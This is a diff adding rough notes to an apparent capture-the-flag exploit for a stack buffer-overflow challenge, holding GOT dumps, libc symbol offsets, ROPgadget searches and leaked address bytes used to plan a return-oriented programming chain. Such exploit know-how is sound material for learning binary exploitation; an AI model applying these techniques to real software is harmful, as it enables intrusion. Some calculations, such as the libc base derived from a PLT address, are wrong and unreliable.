@@ -111,3 +111,167 @@ base = int(leak[:-1],16) - 0x23f90 - 0xF3# readelf -s /lib/x86_64-linux-gnu/libc
 
 p.recvuntil(b"is: ")
 leak = p.recvline()
+
+
+=============== 9 notes ================================
+[*] Main start: 0x40127d
+[*] Puts plt: 0x4010d4
+[*] pop rdi; ret  gadget: 0x23b6a
+[*] puts GOT @ 0x404020
+
+base pointer rbp: 0x7ffec4189e10
+it will be stored: 0x7ffec4189610
+
+# 404020 <puts@GLIBC_2.2.5>
+
+gef➤  got
+
+GOT protection: Partial RelRO | GOT functions: 9
+ 
+[0x404018] putchar@GLIBC_2.2.5  →  0x401030
+[0x404020] puts@GLIBC_2.2.5  →  0x401040
+[0x404028] strlen@GLIBC_2.2.5  →  0x401050
+[0x404030] setbuf@GLIBC_2.2.5  →  0x7f82f3aebad0
+[0x404038] printf@GLIBC_2.2.5  →  0x401070
+[0x404040] __assert_fail@GLIBC_2.2.5  →  0x401080
+[0x404048] memset@GLIBC_2.2.5  →  0x401090
+[0x404050] close@GLIBC_2.2.5  →  0x4010a0
+[0x404058] read@GLIBC_2.2.5  →  0x4010b0
+
+
+gef➤  x 0x404020
+0x404020 <puts@got.plt>:	0x00401040
+gef➤  x/10i  0x00401040
+   0x401040:	endbr64 
+   0x401044:	push   0x1
+   0x401049:	bnd jmp 0x401020
+   0x40104f:	nop
+   0x401050:	endbr64 
+   0x401054:	push   0x2
+   0x401059:	bnd jmp 0x401020
+   0x40105f:	nop
+   0x401060:	endbr64 
+   0x401064:	push   0x3
+gef➤  
+
+
+
+
+hacker@buffer-overflow-level-9:/challenge$ objdump -T /lib/x86_64-linux-gnu/libc.so.6 | grep puts
+0000000000084420 g    DF .text	00000000000001dc  GLIBC_2.2.5 _IO_puts
+0000000000084420  w   DF .text	00000000000001dc  GLIBC_2.2.5 puts    # this value offset
+0000000000124330 g    DF .text	00000000000004f4  GLIBC_2.2.5 putspent
+0000000000126000 g    DF .text	00000000000002d8  GLIBC_2.10  putsgent
+0000000000082ce0  w   DF .text	0000000000000180  GLIBC_2.2.5 fputs
+0000000000082ce0 g    DF .text	0000000000000180  GLIBC_2.2.5 _IO_fputs
+000000000008e320  w   DF .text	000000000000009f  GLIBC_2.2.5 fputs_unlocked
+hacker@buffer-overflow-level-9:/challenge$ 
+
+
+hex(0x401040 - 0x84420) = 0x37cc20  // libc base address
+
+
+00000000004010d0 <puts@plt>:
+  4010d0:       f3 0f 1e fa             endbr64 
+  4010d4:       f2 ff 25 45 2f 00 00    bnd jmpq *0x2f45(%rip)        # 404020 <puts@GLIBC_2.2.5>
+  4010db:       0f 1f 44 00 00          nopl   0x0(%rax,%rax,1)
+
+
+hacker@buffer-overflow-level-9:/challenge$ ROPgadget --binary ./babystack_level9 | grep 'pop rdi'
+0x0000000000401553 : pop rdi ; ret
+
+
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'   //  pop_rdi = 0x23b6a
+ROPgadget --binary ./babystack_level9 | grep 'pop rdi' // pop_rdi = 0x401553
+1st times - $\xf1j
+2nd times - \xb4\x8eC\xb7\x7f
+
+\xa4\xc4\x10\x7f
+ \xb4\x8b\xbb\xa0\x7f
+ $\x8f\xf0+
+
+ ROPgadget --binary ./babystack_level9 | grep 'pop rsi' # no output
+ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rsi'   
+
+ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "/flag"
+
+ hacker@buffer-overflow-level-9:~$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --string "group"
+Strings information
+============================================================
+0x0000000000013c2a : group
+0x0000000000013d14 : group
+0x0000000000013e96 : group
+0x00000000000145f2 : group
+0x0000000000014b7c : group
+0x0000000000015dd5 : group
+0x0000000000015e3e : group
+0x0000000000015edc : group
+0x0000000000015f99 : group
+0x0000000000017bef : group
+0x00000000001b59e3 : group
+0x00000000001b59ee : group
+0x00000000001b5b5c : group
+0x00000000001b7788 : group
+0x00000000001b7a69 : group
+0x00000000001ba6ce : group
+0x00000000001bc3cc : group
+0x00000000001bc60a : group
+0x00000000001eb190 : group
+0x00000000001eb1dc : group
+0x00000000001eb1f3 : group
+hacker@buffer-overflow-level-9:~$ 
+
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rsi'
+0x000000000002601f : pop rsi ; ret
+
+ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rax' 
+0x0000000000036174 : pop rax ; ret
+
+hacker@buffer-overflow-level-9:/challenge$ ROPgadget --binary ./babystack_level9 | grep 'pop rax'   # returned nothing
+
+hacker@buffer-overflow-level-9:/challenge$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep chmod
+   125: 000000000010db90    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
+   631: 000000000010db60    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
+  1015: 000000000010dbe0   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
+  2099: 000000000010dbc0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
+
+
+hacker@buffer-overflow-level-9:/challenge$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "syscall"
+Gadgets information
+============================================================
+0x000000000002284d : syscall
+
+Unique gadgets found: 1
+hacker@buffer-overflow-level-9:/challenge$ 
+
+ 0x4014d8 <main+603>:	call   0x401140 <read@plt>
+
+padding = 2000 - 2300 not worked
+
+
+T protection: Partial RelRO | GOT functions: 9
+ 
+[0x404018] putchar@GLIBC_2.2.5  →  0x401030
+[0x404020] puts@GLIBC_2.2.5  →  0x401040
+[0x404028] strlen@GLIBC_2.2.5  →  0x401050
+[0x404030] setbuf@GLIBC_2.2.5  →  0x7fa87ebdbad0
+[0x404038] printf@GLIBC_2.2.5  →  0x401070
+[0x404040] __assert_fail@GLIBC_2.2.5  →  0x401080
+[0x404048] memset@GLIBC_2.2.5  →  0x401090
+[0x404050] close@GLIBC_2.2.5  →  0x4010a0
+[0x404058] read@GLIBC_2.2.5  →  0x4010b0
+
+
+objdump -M intel -d /challenge/babystack_level9
+  4014bf:	e8 3c fc ff ff       	call   401100 <printf@plt>
+  4014c4:	48 8d 85 00 f8 ff ff 	lea    rax,[rbp-0x800]
+  4014cb:	ba e0 08 00 00       	mov    edx,0x8e0
+  4014d0:	48 89 c6             	mov    rsi,rax
+  4014d3:	bf 00 00 00 00       	mov    edi,0x0
+  4014d8:	e8 63 fc ff ff       	call   401140 <read@plt>
+  4014dd:	b8 00 00 00 00       	mov    eax,0x0
+  4014e2:	c9                   	leave  
+  4014e3:	c3                   	ret  
+
+
+  0x404058 + 0x800 = 0x404858
